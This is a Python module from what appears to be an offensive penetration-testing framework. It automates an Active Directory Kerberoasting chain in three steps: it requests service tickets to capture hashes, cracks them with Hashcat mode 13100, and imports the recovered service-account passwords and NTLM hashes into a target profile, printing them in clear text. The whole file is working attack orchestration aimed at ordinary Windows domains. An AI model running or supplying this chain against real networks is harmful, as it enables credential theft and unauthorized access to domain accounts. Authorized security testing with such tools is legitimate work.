import argparse
import sys
import time
from core.runner import run_module_by_name
from core.target import load_current_profile, get_all_creds, target_add_cred
from core.paths import get_chain_artifacts_dir

def run(args):
    # --- ANSI COLOR PALETTE ---
    G, R, C, Y, B, W = '\033[92m', '\033[91m', '\033[96m', '\033[93m', '\033[94m', '\033[0m'
    BOLD = '\033[1m'

    # --- 1. SETUP ---
    data, _ = load_current_profile()
    creds = get_all_creds(data)
    artifacts = get_chain_artifacts_dir(data["name"], "kerberoast")
    
    hashes = artifacts / "kerberoast_hashes.txt"
    cracked = artifacts / "cracked.txt"

    # --- HEADER ---
    print(f"\n{B}┌──────────────────────────────────────────────────────────┐{W}")
    print(f"{B}│{W}  {BOLD}{C}CHAIN:{W} ACTIVE DIRECTORY KERBEROASTING                {B}│{W}")
    print(f"{B}└──────────────────────────────────────────────────────────┘{W}")

    # --- PRECHECK ---
    if not creds or not data.get("domain"):
        print(f"\n{R}[!] Error: Missing credentials or domain context.{W}")
        return

    if not getattr(args, "auto", False):
        prompt = f"\n    {B}[{W}{C}?{W}{B}]{W} Start {BOLD}Kerberoast -> Crack -> Import{W} chain? (Y/n): "
        if not input(prompt).lower() in ["", "y"]:
            print(f"{Y}[*] Chain aborted by user.{W}")
            return

    # --- STEP 1: KERBEROAST ---
    print(f"\n{B}[{W}{G}*{W}{B}]{W} {BOLD}STEP 1: SERVICE TICKET REQUESTS{W}")
    
    if not hashes.exists() or hashes.stat().st_size == 0:
        print(f"    {B}╰─{W} Requesting tickets for {C}{data.get('domain')}{W}...", end="\r")
        run_module_by_name("ad.kerberoast", ["--out", str(hashes), "--quiet"], data)
        
        if not ensure_nonempty_file(hashes, "No hashes captured."):
            return
        print(f"    {B}╰─{W} Captured: {G}{hashes.name}{W}                          ")
    else:
        print(f"    {B}╰─{W} Status: {Y}Skipping (Hashes already exist){W}")

    # --- STEP 2: CRACK ---
    print(f"\n{B}[{W}{G}*{W}{B}]{W} {BOLD}STEP 2: BRUTE-FORCE ATTACK{W}")
    
    if not cracked.exists() or cracked.stat().st_size == 0:
        print(f"    {B}╰─{W} Engine: {C}Hashcat (Mode 13100){W}")
        print(f"    {B}╰─{W} Cracking tickets, please wait...", end="\r")
        
        run_module_by_name("crack.hash", [
            str(hashes), 
            "--mode", "13100", 
            "--out", str(cracked), 
            "--quiet"
        ], data)

        if not ensure_nonempty_file(cracked, "Cracking failed."):
            return
        print(f"    {B}╰─{W} Status: {G}SUCCESS (Results saved to cracked.txt){W}")
    else:
        print(f"    {B}╰─{W} Status: {Y}Skipping (Cracked file already exists){W}")

    # --- STEP 3: IMPORT ---
    print(f"\n{B}[{W}{G}*{W}{B}]{W} {BOLD}STEP 3: CREDENTIAL IMPORT{W}")
    
    new_creds = run_module_by_name("parse.hash", [str(cracked)], data)

    if new_creds:
        for c in new_creds:
            print(f"    {G}┌──{W} {BOLD}RECOVERED SERVICE ACCOUNT{W}")
            print(f"    {G}│{W} {BOLD}USER:{W} {C}{c['user']}{W}")
            print(f"    {G}│{W} {BOLD}TYPE:{W} {Y}{c['type']}{W}")
            print(f"    {G}│{W} {BOLD}PASS:{W} {G}{c['secret']}{W}")
            print(f"    {G}└──{W}")
            
            target_add_cred(
                argparse.Namespace(
                    user=c["user"],
                    password=c["secret"] if c["type"] == "password" else None,
                    hash=c["secret"] if c["type"] == "ntlm" else None,
                    aes=None,
                    ccache=None
                )
            )
        
        print(f"\n{B}[{W}{G}*{W}{B}]{W} Successfully imported {len(new_creds)} credentials.")
    
    print(f"\n{B}─────────────────────── {G}CHAIN COMPLETE{W} ───────────────────────\n")

def ensure_nonempty_file(path, msg):
    if path.exists() and path.stat().st_size > 0:
        return True
    print(f"    \033[91m╰─[-] Error: {msg}\033[0m")
    return False